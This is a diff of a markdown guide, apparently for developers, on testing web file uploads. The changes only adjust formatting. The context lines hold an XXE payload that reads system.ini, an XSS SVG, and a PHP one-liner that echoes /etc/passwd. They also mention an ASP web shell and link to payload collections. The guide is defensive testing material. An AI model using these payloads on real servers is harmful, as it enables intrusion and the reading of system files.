@@ -51,11 +51,10 @@ src="https://www.yourSiteHere.com/dashboard"></iframe>
 ```
 
 
-
 Before testing the files below, try uploading calc.exe from a Windows computer. If it successfully uploads, start the remediation procedures. If calc.exe does not upload, or if you want to test further, attempt to upload the files below.
 
 ### XXE
-**XXE File: Test.xml**
+**XXE File: Test.xml** \
 Please note that the file called below should be replaced with a valid Linux file if the Web Server is Linux based.
 ```
 <?xml version="1.0"?>
@@ -64,7 +63,7 @@ Please note that the file called below should be replaced with a valid Linux fil
 <!ENTITY test SYSTEM "file:///c:/Windows/system.ini" >]><test>&test;</test>
 ```
 
-**SVG File: test.svg**
+**SVG File: test.svg** \
 https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload
 ```
 <?xml version="1.0" standalone="yes"?>
@@ -74,7 +73,7 @@ https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload
 </svg>
 ```
 ### XSS
-**SVG file: testabc.svg**
+**SVG file: testabc.svg** \
 https://github.com/makeplane/plane/security/advisories/GHSA-rcg8-g69v-x23j
 ```
 <svg xmlns="http://www.w3.org/2000/svg" width="400" height="400" viewBox="0 0 124 124" fill="none">
@@ -85,7 +84,7 @@ https://github.com/makeplane/plane/security/advisories/GHSA-rcg8-g69v-x23j
 </svg>
 ```
 
-**PDF File: XSSinPDF.pdf**
+**PDF File: XSSinPDF.pdf** \
 https://portswigger.net/research/portable-data-exfiltration
 
 https://owasp.org/www-chapter-belgium/assets/2007/2007-06-22/OWASP_BeLux_2007-06-22_Protecting_Web_Applications_from_Universal_PDF_XSS.pdf
@@ -95,13 +94,13 @@ Known benign XSSinPDF to download: https://github.com/ynsmroztas/pdfsvgxsspayloa
 ### Remote Code Execution
 These files should be deleted immediately after testing. Leaving these files on your web server could lead to true impact.
 
-**PHP File Upload: file1.php**
+**PHP File Upload: file1.php** \
 Please note that the file called below should be replaced with a valid Windows file if the Web Server is Linux based.
 
 ```
 <?php echo file_get_contents('/etc/passwd'); ?>
 ```
-**asp Web Shell: test.asp**
+**asp Web Shell: test.asp** \
 The file below is a butchered version of the file linked below. This version is broken to reduce potential impact if a developer uses it incorrectly or keeps the file uploaded on the web server. If you would like to use a working version of this script, visit the link below. For testing purposes, you do not need a working version.
 
 Source: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20ASP/shell.asp
